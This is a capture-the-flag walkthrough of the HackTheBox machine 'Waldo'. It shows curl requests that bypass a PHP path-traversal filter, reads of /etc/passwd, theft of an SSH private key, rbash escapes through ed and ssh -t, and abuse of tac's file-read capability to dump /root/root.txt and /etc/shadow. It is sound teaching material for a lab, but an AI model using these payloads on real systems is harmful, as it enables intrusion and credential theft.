# HTB: Waldo

[ctf](/tags#ctf ) [hackthebox](/tags#hackthebox ) [htb-waldo](/tags#htb-waldo
) [docker](/tags#docker ) [php](/tags#php ) [ssh](/tags#ssh )
[rbash](/tags#rbash ) [capabilities](/tags#capabilities )  
  
Dec 15, 2018

HTB: Waldo

![](https://0xdfimages.gitlab.io/img/waldo-cover.png) Waldo was a pretty
straight forward box, with a few twists that weren’t too difficult to
circumvent. First, I’ll take advantage of a php website, that allows me to
leak its source. I’ll use that to bypass filters to read files outside the
webroot. In doing so, I’ll find an ssh key that gets me into a container. I’ll
notice that I can actually ssh back into localhost again to get out of the
container, but with a restricted rbash shell. After escaping, I’ll find the
tac program will the linux capability set to allow for full system read,
giving me full read access over the entire system, including the flag.

## Box Info

Name | [Waldo](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fwaldo) [ ![Waldo](../img/box-waldo.png)](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fwaldo)  
[Play on
HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fwaldo)  
---|---  
Release Date | [04 Aug 2018](https://twitter.com/hackthebox_eu/status/1024573734668132353)  
Retire Date | 04 May 2024  
OS | Linux ![Linux](../img/Linux.png)  
Base Points | Medium [30]  
Rated Difficulty | ![Rated difficulty for Waldo](../img/waldo-diff.png)  
Radar Graph | ![Radar chart for Waldo](../img/waldo-radar.png)  
![First Blood User](../img/first-blood-user.png) | 00:16:24[![octa](https://www.hackthebox.com/badge/image/19927) octa](https://app.hackthebox.com/users/19927)  
  
![First Blood Root](../img/first-blood-root.png) | 03:44:49[![0xEA31](https://www.hackthebox.com/badge/image/13340) 0xEA31](https://app.hackthebox.com/users/13340)  
  
Creators | [![strawman](https://www.hackthebox.com/badge/image/1895) strawman](https://app.hackthebox.com/users/1895)  
[![capnspacehook](https://www.hackthebox.com/badge/image/35484)
capnspacehook](https://app.hackthebox.com/users/35484)  
  
  
## Recon

### nmap

Start with nmap, and notice a few things:

  1. The main attack point is likely a website.
  2. ssh is open, so I should definitely look for keys once I get a shell as a save point (if not an initial access vector).
  3. Something odd is going on with port 8888, as our packet gets no response at all.
  4. The [nginx version suggests Trusty](https://launchpad.net/~nginx/+archive/ubuntu/stable), which is [Ubuntu 14.04](https://wiki.ubuntu.com/Releases).

    
    
    root@kali# mkdir nmap; nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.87
    
    Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-05 22:08 EDT
    Nmap scan report for 10.10.10.87
    Host is up (0.019s latency).
    Not shown: 65532 closed ports
    PORT     STATE    SERVICE
    22/tcp   open     ssh
    80/tcp   open     http
    8888/tcp filtered sun-answerbook
    
    Nmap done: 1 IP address (1 host up) scanned in 11.45 seconds
    
    root@kali# nmap -sU -p- --min-rate 5000 -oA nmap/alludp 10.10.10.87
    Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-05 22:11 EDT
    Warning: 10.10.10.87 giving up on port because retransmission cap hit (10).
    Nmap scan report for 10.10.10.87
    Host is up (0.021s latency).
    All 65535 scanned ports on 10.10.10.87 are open|filtered (65385) or closed (150)
    
    Nmap done: 1 IP address (1 host up) scanned in 144.84 seconds
    
    root@kali# nmap -p 22,80,8888 -sV -sC -oA nmap/scripts 10.10.10.87
    Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-05 22:59 EDT
    Nmap scan report for 10.10.10.87
    Host is up (0.020s latency).
    
    PORT     STATE    SERVICE        VERSION
    22/tcp   open     ssh            OpenSSH 7.5 (protocol 2.0)
    | ssh-hostkey:
    |   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e (RSA)
    |   256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 (ECDSA)
    |_  256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd (ED25519)
    80/tcp   open     http           nginx 1.12.2
    |_http-server-header: nginx/1.12.2
    | http-title: List Manager
    |_Requested resource was /list.html
    |_http-trane-info: Problem with XML parsing of /evox/about
    8888/tcp filtered sun-answerbook
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 8.95 seconds
    

### Website - Port 80

#### Site

The site presents as a Where’s Waldo themed List Manager:

![1533591731247](https://0xdfimages.gitlab.io/img/1533591731247.png)

Beyond observing the awesome background (from [Where’s Waldo? In Hollywood
(Book 4 - Scene 3)](https://www.deviantart.com/where-is-waldo-wally/art/Where-
s-Waldo-In-Hollywood-Book-4-Scene-3-462460774)) and the silly script that
turns my mouse into a waldo head, I can create lists, add and delete items
from them:

![1533591783672](https://0xdfimages.gitlab.io/img/1533591783672.png)

When I add a list, it is added in numerical order, and always named list[x],
where x is an increasing int.

#### Under the Hood

If I watch what’s happening as I create and delete lists and items in a proxy
(like burp, or firefox dev tools), there’s a series of POST requests to 4 php
scripts:

  * `dirRead.php`
  * `fileRead.php`
  * `fileWrite.php`
  * `fileDelete.php`

Here’s an example selection of requests from burp generated by interacting
with the site:

![1533592009855](https://0xdfimages.gitlab.io/img/1533592009855.png)

#### dirRead.php

If I pull up one of the POSTs to `dirRead.php`, I’ll see a request which
includes a path:

    
    
    POST /dirRead.php HTTP/1.1
    Host: 10.10.10.87
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://10.10.10.87/list.html
    Content-type: application/x-www-form-urlencoded
    Content-Length: 13
    Connection: close
    
    path=./.list/
    

And a response like this:

    
    
    HTTP/1.1 200 OK
    Server: nginx/1.12.2
    Date: Mon, 06 Aug 2018 21:47:10 GMT
    Content-Type: application/json
    Connection: close
    X-Powered-By: PHP/7.1.16
    Content-Length: 26
    
    [".","..","list1","list2"]
    

If I send it back with `path=/`, I get the following, which indicates from
php’s perspective, the root is this directory, likely the webroot:

    
    
    [".","..",".list","background.jpg","cursor.png","dirRead.php","face.png","fileDelete.php","fileRead.php","fileWrite.php","index.php","list.html","list.js"]
    

#### fileRead.php

With an idea of the files and where they are, reading files seems like the
next place to check out. The request passes a `file` parameter:

    
    
    POST /fileRead.php HTTP/1.1
    Host: 10.10.10.87
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://10.10.10.87/list.html
    Content-type: application/x-www-form-urlencoded
    Content-Length: 18
    Connection: close
    
    file=./.list/list1
    

The the response gives what looks like the content of the file:

    
    
    HTTP/1.1 200 OK
    Server: nginx/1.12.2
    Date: Mon, 06 Aug 2018 21:51:22 GMT
    Content-Type: application/json
    Connection: close
    X-Powered-By: PHP/7.1.16
    Content-Length: 71
    
    {"file":"{\"1\":\"Enumerate<br>\",\"2\":\"...\",\"3\":\"Profit<br>\"}"}
    

### Arbitrary File Read

With those two functions, I can get to get arbitrary directory listing and
file reads.

#### Detecting Filters

I already showed that doing a directory read on `/` returns the html root, not
the box root. Can I just use `../`? Well, no:

    
    
    root@kali# curl -X POST -d "path=/" http://10.10.10.87/dirRead.php
    [".","..",".list","background.jpg","cursor.png","dirRead.php","face.png","fileDelete.php","fileRead.php","fileWrite.php","index.php","list.html","list.js"]
    
    root@kali# curl -X POST -d "path=/../" http://10.10.10.87/dirRead.php
    [".","..",".list","background.jpg","cursor.png","dirRead.php","face.png","fileDelete.php","fileRead.php","fileWrite.php","index.php","list.html","list.js"]
    

#### Source

I could start to guess at bypasses for the filtering that’s going on, but
rather, I’ll grab the site source. I can pipe the curl output into `jq` with
the `-r` flag to print the string as raw, and select the `file` object (if you
don’t know [`jq`](https://stedolan.github.io/jq/), you should check it out -
it comes in handy in so many situations with json data.

So this command will grab `dirRead.php`:

    
    
    root@kali# curl -s -X POST -d "file=dirRead.php" http://10.10.10.87/fileRead.php | jq -r .file
    
    
    
    <?php
    
    if($_SERVER['REQUEST_METHOD'] === "POST"){
            if(isset($_POST['path'])){
                    header('Content-type: application/json');
                    $_POST['path'] = str_replace( array("../", "..\""), "", $_POST['path']);
                    echo json_encode(scandir("/var/www/html/" . $_POST['path']));
            }else{
                    header('Content-type: application/json');
                    echo '[false]';
            }
    }
    

`fileRead.php`:

    
    
    <?php
    
    
    if($_SERVER['REQUEST_METHOD'] === "POST"){
            $fileContent['file'] = false;
            header('Content-Type: application/json');
            if(isset($_POST['file'])){
                    header('Content-Type: application/json');
                    $_POST['file'] = str_replace( array("../", "..\""), "", $_POST['file']);
                    if(strpos($_POST['file'], "user.txt") === false){
                            $file = fopen("/var/www/html/" . $_POST['file'], "r");
                            $fileContent['file'] = fread($file,filesize($_POST['file']));
                            fclose();
                    }
            }
            echo json_encode($fileContent);
    }
    

`fileWrite.php`:

    
    
    <?php
    
    if($_SERVER['REQUEST_METHOD'] === "POST"){
            header('Content-Type: application/json');
            $condition['result'] = false;
            if(isset($_POST['listnum'])){
                    if(is_numeric($_POST['listnum'])){
                            $myFile = "/var/www/html/.list/list" . $_POST['listnum'];
                            $handle = fopen($myFile, 'w');
                            $data = $_POST['data'];
                            fwrite($handle, $data);
                            fclose();
                            $condition['result'] = true;
                    }
            }
            echo json_encode($condition);
    }
    

`fileDelete.php`:

    
    
    <?php
    
    if($_SERVER['REQUEST_METHOD'] === "POST"){
            if(isset($_POST['listnum'])){
                    header('Content-Type: application/json');
                    if(is_numeric($_POST['listnum'])){
                            $myFile = "/var/www/html/.list/list" . $_POST['listnum'];
                            unlink($myFile);
                            header('Content-Type: application/json');
                            echo '[true]';
                    }else{
                            header('Content-Type: application/json');
                            echo '[false]';
                    }
            }else{
                    header('Content-Type: application/json');
                    echo '[false]';
            }
    }
    

#### Bypassing Filters

I can see in both `dirRead` and `fileRead` the user input is filtered to
remove directory traversal attacks. There’s a third filter there in `fileRead`
that prevents me from reading user.txt:

file | filter  
---|---  
dirRead | `$_POST['path'] = str_replace( array("../", "..\""), "", $_POST['path']);`  
fileRead | `$_POST['file'] = str_replace( array("../", "..\""), "", $_POST['file']);`  
fileRead | `strpos($_POST['file'], "user.txt") === false`  
  
Fortunately for me, that style filter can be bypassed by including a string
that, after the `str_replace`, will result in what I want. `str_replace` is
not recursive. It only makes one pass over the string. So, `str_replace(
array("../", "..\""), "", "....//") == "../"`.

To test, I’ll get a directory listing of `/` and grab `/etc/passwd`:

    
    
    root@kali# curl -s -X POST -d "path=....//....//....//" http://10.10.10.87/dirRead.php | jq -rc .
    [".","..",".dockerenv","bin","dev","etc","home","lib","media","mnt","proc","root","run","sbin","srv","sys","tmp","usr","var"]
    
    root@kali# curl -s -X POST -d "file=....//....//....//etc/passwd" http://10.10.10.87/fileRead.php | jq -r .file
    root:x:0:0:root:/root:/bin/ash
    bin:x:1:1:bin:/bin:/sbin/nologin
    daemon:x:2:2:daemon:/sbin:/sbin/nologin
    adm:x:3:4:adm:/var/adm:/sbin/nologin
    lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
    sync:x:5:0:sync:/sbin:/bin/sync
    shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
    halt:x:7:0:halt:/sbin:/sbin/halt
    mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
    news:x:9:13:news:/usr/lib/news:/sbin/nologin
    uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
    operator:x:11:0:operator:/root:/bin/sh
    man:x:13:15:man:/usr/man:/sbin/nologin
    postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
    cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
    ftp:x:21:21::/var/lib/ftp:/sbin/nologin
    sshd:x:22:22:sshd:/dev/null:/sbin/nologin
    at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
    squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
    xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
    games:x:35:35:games:/usr/games:/sbin/nologin
    postgres:x:70:70::/var/lib/postgresql:/bin/sh
    cyrus:x:85:12::/usr/cyrus:/sbin/nologin
    vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
    ntp:x:123:123:NTP:/var/empty:/sbin/nologin
    smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
    guest:x:405:100:guest:/dev/null:/sbin/nologin
    nobody:x:65534:65534:nobody:/home/nobody:/bin/sh
    nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin
    

#### Interesting Files

In enumerating the box with dir list and file read, I’ll find a few
interesting things.

  * Right away we see `.dockerenv` in the root. Looking around further, the box is sparse, so I am likely in a container.

  * There’s one user on the box, nobody. There’s a `user.txt` in the nobody home directory, but as mentioned above, I can’t read it. I’ll need to get shell access.

  * There’s also a .ssh folder, which contains a file named `.monitor`, which is a private ssh key. I’ll save it with this command:
    
        root@kali# curl -s -X POST -d "file=....//....//....//home/nobody/.ssh/.monitor" http://10.10.10.87/fileRead.php | jq -r .file > ~/id_waldo_nobody
    

## SSH Access as nobody

Now with an ssh key, I can get a shell on Waldo as nobody:

    
    
    root@kali# ssh -i id_rsa_waldo_nobody nobody@10.10.10.87
    Welcome to Alpine!
    
    The Alpine Wiki contains a large amount of how-to guides and general
    information about administrating Alpine systems.
    See <http://wiki.alpinelinux.org>.
    waldo:~$ id
    uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
    

This gives me access to `user.txt`:

    
    
    waldo:~$ wc -c user.txt
    33 user.txt
    waldo:~$ cat user.txt
    32768bcd...
    

## Privesc / Pivot: nobody -> monitor

### Discovery

The next step involves noticing a bunch of things that are acting weird and
some experimentation (or, if you’re on free, noticing in the process list that
someone else has already sshed into localhost as monitor).

  * The private key I found was named .monitor. I used it with nobody, but it didn’t have that name in it.

  * monitor isn’t a user on this host.

  * ssh on this box is configured to listen on 8888. When I tried to talk to 8888 from the attacker box, it hangs (remember the filtered return from the original `nmap`). But here’s the interesting parts from the ssh config:
    
        waldo:/tmp$ grep -e "Port " -e AllowUser  /etc/ssh/sshd_config
    Port 8888
    AllowUsers nobody
    

  * I still see the host listening on 22 and 8888:
    
        waldo:~$ netstat -lnt
    Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State
    tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
    tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN
    tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN
    tcp        0      0 :::80                   :::*                    LISTEN
    tcp        0      0 :::22                   :::*                    LISTEN
    tcp        0      0 :::8888                 :::*                    LISTEN
    

My theory at this point is that I’m in a container, and that the host is
forwarding post 22 from the outside to port 8888 on the container. But the
host is also still listening on port 22 for itself.

### Restricted Shell

If I try sshing as monitor to localhost, I get a new shell, and a new host!
(And a huge ascii art banner!):

    
    
    waldo:~$ ssh -i /home/nobody/.ssh/.monitor monitor@localhost
    Linux waldo 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1 (2018-04-29) x86_64
               &.
              @@@,@@/ %
           #*/%@@@@/.&@@,
       @@@#@@#&@#&#&@@@,*%/
       /@@@&###########@@&*(*
     (@################%@@@@@.     /**
     @@@@&#############%@@@@@@@@@@@@@@@@@@@@@@@@%((/
     %@@@@%##########&@@@....                 .#%#@@@@@@@#
     @@&%#########@@@@/                        */@@@%(((@@@%
        @@@#%@@%@@@,                       *&@@@&%(((#((((@@(
         /(@@@@@@@                     *&@@@@%((((((((((((#@@(
           %/#@@@/@ @#/@          ..@@@@%(((((((((((#((#@@@@@@@@@@@@&#,
              %@*(@#%@.,       /@@@@&(((((((((((((((&@@@@@@&#######%%@@@@#    &
            *@@@@@#        .&@@@#(((#(#((((((((#%@@@@@%###&@@@@@@@@@&%##&@@@@@@/
           /@@          #@@@&#(((((((((((#((@@@@@%%%%@@@@%#########%&@@@@@@@@&
          *@@      *%@@@@#((((((((((((((#@@@@@@@@@@%####%@@@@@@@@@@@@###&@@@@@@@&
          %@/ .&%@@%#(((((((((((((((#@@@@@@@&#####%@@@%#############%@@@&%##&@@/
          @@@@@@%(((((((((((##(((@@@@&%####%@@@%#####&@@@@@@@@@@@@@@@&##&@@@@@@@@@/
         @@@&(((#((((((((((((#@@@@@&@@@@######@@@###################&@@@&#####%@@*
         @@#(((((((((((((#@@@@%&@@.,,.*@@@%#####@@@@@@@@@@@@@@@@@@@%####%@@@@@@@@@@
         *@@%((((((((#@@@@@@@%#&@@,,.,,.&@@@#####################%@@@@@@%######&@@.
           @@@#(#&@@@@@&##&@@@&#@@/,,,,,,,,@@@&######&@@@@@@@@&&%######%@@@@@@@@@@@
            @@@@@@&%&@@@%#&@%%@@@@/,,,,,,,,,,/@@@@@@@#/,,.*&@@%&@@@@@@&%#####%@@@@.
              .@@@###&@@@%%@(,,,%@&,.,,,,,,,,,,,,,.*&@@@@&(,*@&#@%%@@@@@@@@@@@@*
                @@%##%@@/@@@%/@@@@@@@@@#,,,,.../@@@@@%#%&@@@@(&@&@&@@@@(
                .@@&##@@,,/@@@@&(.  .&@@@&,,,.&@@/         #@@%@@@@@&@@@/
               *@@@@@&@@.*@@@          %@@@*,&@@            *@@@@@&.#/,@/
              *@@&*#@@@@@@@&     #@(    .@@@@@@&    ,@@@,    @@@@@(,@/@@
              *@@/@#.#@@@@@/    %@@@,   .@@&%@@@     &@&     @@*@@*(@@#
               (@@/@,,@@&@@@            &@@,,(@@&          .@@%/@@,@@
                 /@@@*,@@,@@@*         @@@,,,,,@@@@.     *@@@%,@@**@#
                   %@@.%@&,(@@@@,  /&@@@@,,,,,,,%@@@@@@@@@@%,,*@@,#@,
                    ,@@,&@,,,,(@@@@@@@(,,,,,.,,,,,,,,**,,,,,,.*@/,&@
                     &@,*@@.,,,,,..,,,,&@@%/**/@@*,,,,,&(.,,,.@@,,@@
                     /@%,&@/,,,,/@%,,,,,*&@@@@@#.,,,,,.@@@(,,(@@@@@(
                      @@*,@@,,,#@@@&*..,,,,,,,,,,,,/@@@@,*(,,&@/#*
                      *@@@@@(,,@*,%@@@@@@@&&#%@@@@@@@/,,,,,,,@@
                           @@*,,,,,,,,,.*/(//*,..,,,,,,,,,,,&@,
                            @@,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@@
                            &@&,,,,,,,,,,,,,,,,,,,,,,,,,,,,&@#
                             %@(,,,,,,,,,,,,,,,,,,,,,,,,,,,@@
                             ,@@,,,,,,,,@@@&&&%&@,,,,,..,,@@,
                              *@@,,,,,,,.,****,..,,,,,,,,&@@
                               (@(,,,.,,,,,,,,,,,,,,.,,,/@@
                               .@@,,,,,,,,,,,,,...,,,,,,@@
                                ,@@@,,,,,,,,,,,,,,,,.(@@@
                                  %@@@@&(,,,,*(#&@@@@@@,
    
                                Here's Waldo, where's root?
    Last login: Thu Aug  9 07:00:00 2018 from 127.0.0.1
    

And it’s a quite restricted shell:

    
    
    monitor@waldo:~$ cd /
    -rbash: cd: restricted
    
    monitor@waldo:~$ echo $PATH
    /home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1
    

I can’t change directory. There’s a `bin` dir with `ls` and 3 text editors,
which is basically the only commands I can run.

    
    
    monitor@waldo:~$ ls bin/
    ls  most  red  rnano
    

There’s also this `app-dev` directory (more on that later).

### Escape

I found 2 ways to escape from the restricted shell.

#### What Sets the Shell

The `rbash` environment I’m given is set in two places. First, if i look in
`/etc/passwd`for the monitor user, I’ll see its shell is set to `rbash`:

    
    
    monitor@waldo:~$ grep monitor /etc/passwd
    monitor:x:1001:1001:User for editing source and monitoring logs,,,:/home/monitor:/bin/rbash
    

`rbash` will restrict my use of `cd`, changing the path, and calling programs
outside my given path. Then, the path is set on the last line of the .bashrc
file, which is sourced at shell creation time:

    
    
    monitor@waldo:~$ tail -1 .bashrc
    PATH=/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1
    

In both escapes that follow, once I’m able to get a different shell, I’m able
to change the path, and I’ve completely escaped.

#### Intended Route: red

In the bin dir, I’ll find a few editors:

    
    
    monitor@waldo:~$ ls -l bin
    total 0
    lrwxrwxrwx 1 root root  7 May  3  2018 ls -> /bin/ls
    lrwxrwxrwx 1 root root 13 May  3  2018 most -> /usr/bin/most
    lrwxrwxrwx 1 root root  7 May  3  2018 red -> /bin/ed
    lrwxrwxrwx 1 root root  9 May  3  2018 rnano -> /bin/nano
    

For each editor, they link back to the normal versions. Sometimes there’s an
`r` in front of the name (to imply restricted). Neither `nano` nor `most` have
any ability to run shell commands.

`red` is the name for the restricted version of `ed`, that doesn’t allow you
to call system commands from inside it, for example. But this `red` just links
back to unrestricted `ed`, not to an instance of `red`.

To escape `rbash` via `ed`, I’ll take advantage of `ed`’s ability to run shell
commands. From the `ed` man page:

> !_command_
>
> Executes _command_ via **sh**(1). If the first character of _command_ is
> ‘!’, then it is replaced by text of the previous _‘!command’_. **ed** does
> not process _command_ for backslash () escapes. However, an unescaped _’%’_
> is replaced by the default filename. When the shell returns from execution,
> a ‘!’ is printed to the standard output. The current line is unchanged.

So, I can just open `ed`, type `!/bin/sh`, and have a full shell:

    
    
    monitor@waldo:~$ red
    !/bin/sh
    $ pwd
    /home/monitor
    $ cd /
    $ ls
    bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
    

I’ll need to set the path to something more reasonable, but that’s easy enough
outside of `rbash`:

    
    
    monitor@waldo:/$ export PATH=/root/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    

#### Unintended Route: ssh -t

When you run ssh with the `-t` flag, it creates a pseudo-tty within the
current session and runs the given command, exiting when the command
completes. So if I use `-t bash`, I get a normal shell, skipping the `rbash`
all together. I will need to set the `PATH` variable on getting in to make the
shell functional:

    
    
    waldo:~$ ssh -i /home/nobody/.ssh/.monitor monitor@localhost -t bash
    monitor@waldo:~$ cd /
    monitor@waldo:/$ id
    bash: id: command not found
    monitor@waldo:/$ export PATH=/root/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    monitor@waldo:/$ id
    uid=1001(monitor) gid=1001(monitor) groups=1001(monitor)
    

On the free servers, which had a lot of users going at once, this way was
often given away because it shows up in the process list of the container, so
once someone figured it out, it was obviously there for others to grab and
use.

## Privesc: Full Disk Read as root

### logMonitor

In the monitor home directory, in the `app-dev` folder, there’s code and an
executable for a program called `logMonitor`. Looking at the code, it will,
depending on the flag passed in, read a log file, and output it to stdout.

    
    
    monitor@waldo:~/app-dev$ find . -type f -ls
       656316     16 -r-xr-x---   1 app-dev  monitor     13706 May  3 16:50 ./v0.1/logMonitor-0.1
       656315     16 -r--r-----   1 app-dev  monitor     13704 May  3 16:50 ./logMonitor.bak
       655371      8 -rw-rw-rw-   1 monitor  monitor      6824 Aug  8 10:41 ./logMonitor.o
       656304      4 -r-xr-x---   1 app-dev  monitor       795 May  3 16:50 ./.restrictScript.sh
       656309      4 -rw-rw----   1 app-dev  monitor      2677 May  3 16:50 ./logMonitor.c
       656310      4 -rw-rw----   1 app-dev  monitor       488 May  3 16:50 ./logMonitor.h
       656311      4 -rwxr-----   1 app-dev  monitor       266 May  3 16:50 ./makefile
       655372     16 -rw-rw-rw-   1 monitor  monitor     13704 Aug  8 10:41 ./logMonitor
       655370   2168 -rw-rw-rw-   1 monitor  monitor   2217712 Aug  8 10:41 ./logMonitor.h.gch
    

The version in the main directory doesn’t seem to work, but the one in `v0.1`
does. But to work, it must print out the contents of files that are only
available to privileged users. For example, with a `-a` flag, it will print
the contents of “/var/log/auth.log”

    
    
    monitor@waldo:~/app-dev$ ls -l /var/log/auth.log
    -rw-r----- 1 root adm 16283 Aug  9 12:18 /var/log/auth.log
    

The obvious answer would be the SUID bit on the executable, but (as you can
see above) it’s not set.

### Capabilities

Linux has a concept of [capabilities](http://man7.org/linux/man-
pages/man7/capabilities.7.html), which allow you to assign a program rights to
do certain things typically reserved for root. So, for example, the
`CAP_NET_BIND_SERVICE` capability allows a program not running as root to bind
to a port under 1024.

If I look at this program, using `getcap`, I’ll see it has a capability
assigned:

    
    
    monitor@waldo:~/app-dev$ getcap v0.1/logMonitor-0.1
    v0.1/logMonitor-0.1 = cap_dac_read_search+ei
    

`CAP_DAC_READ_SEARCH` allows the program to bypass file and directory read
permission checks. Neat.

the `+ei` means that the capability is:

  * (e)ffective - used by the kernel to perform permission checks
  * (i) inheritable - preserved across execve or fork calls

### tac

After spending some time trying to figure out how to exploit `logMonitor-0.1`,
I decided to look for other files with capabilities on the box:

    
    
    monitor@waldo:~/app-dev$ find / -exec getcap {} \; 2>/dev/null
    /usr/bin/tac = cap_dac_read_search+ei
    /home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
    

`tac` is just reverse `cat`, as it in prints contents of files to stdout, but
last line first.

With `tac`, I can get the root flag:

    
    
    monitor@waldo:~/app-dev$ tac /root/root.txt
    8fb67c84...
    

If I wanted to read other files with more than one line, just `tac` twice:

    
    
    monitor@waldo:/$ tac /etc/shadow | tac
    root:$6$tRIbOmog$v7fPb8FKIT0QryKrm7RstojMs.ZXi4xxHz2Uix9lsw52eWtsURc9dwWMOyt4Gpd6QLtVtDnU1NO5KE5gF48r8.:17654:0:99999:7:::
    daemon:*:17653:0:99999:7:::
    bin:*:17653:0:99999:7:::
    sys:*:17653:0:99999:7:::
    sync:*:17653:0:99999:7:::
    ...[snip]...
    

## No root Shell

I couldn’t find any way to turn this into a root shell, and in conversations
with the author, that’s the intention for the box. My primary focus was on
exploiting `logMonitor-0.1`, but couldn’t get anything to work.

## Beyond Root: Lin Enum Updates Based on Waldo

When this box was released, I ran `LinEnum.sh` on the box as monitor trying to
get to root. Nothing much jumped out at me. But when I run it today, I see
this section:

    
    
    [+] Files with POSIX capabilities set:
    /usr/bin/tac = cap_dac_read_search+ei
    /home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
    
    
    [+] Users with specific POSIX capabilities:
    cap_dac_read_search monitor
    
    
    [+] Capabilities associated with the current user:
    cap_dac_read_search
    
    
    [+] Files with the same capabilities associated with the current user (You may want to try abusing those capabilities):
    /usr/bin/tac = cap_dac_read_search+ei
    /home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
    
    
    [+] Permissions of files with the same capabilities associated with the current user:
    -rwxr-xr-x 1 root root 39752 Feb 22  2017 /usr/bin/tac
    -r-xr-x--- 1 app-dev monitor 13706 May  3  2018 /home/monitor/app-dev/v0.1/logMonitor-0.1
    

Did I really miss this at the time? Or was it recently added?

So I jumped over to the GitHub for
[LinEnum](https://github.com/rebootuser/LinEnum), and clicked on `LinEnum.sh`
to open the code. A quick ctrl-f later, I found the code that checks, at lines
[1173-1245](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh#L1173).

If you click on the line number, and then the 3 dots that pop up, and then
select “View git blame”, you will see a list of every commit to this repo that
changes this line of code. In this case, I’ll see just one commit:

![](https://0xdfimages.gitlab.io/img/waldo-find-blame.gif)

I can click on the commit link
([#24](https://github.com/rebootuser/LinEnum/pull/24) in this case) to see the
details of the merge request that added this code to `LinEnum`. It was
submitted by SaeedHashem on Aug 24 2018, merged on Aug 27:

![1544535718628](https://0xdfimages.gitlab.io/img/1544535718628.png)

He says it was inspired by a CTF. Could it be that CTF is HackTheBox? There is
a user on HackTheBox
[saeedhashem](https://www.hackthebox.eu/home/users/profile/34826), who
completed Waldo around August, so it seems likely. Big props to Saeed for
taking what he learned in HTB and using it to update open-source tools!

[](/2018/12/15/htb-waldo.html)

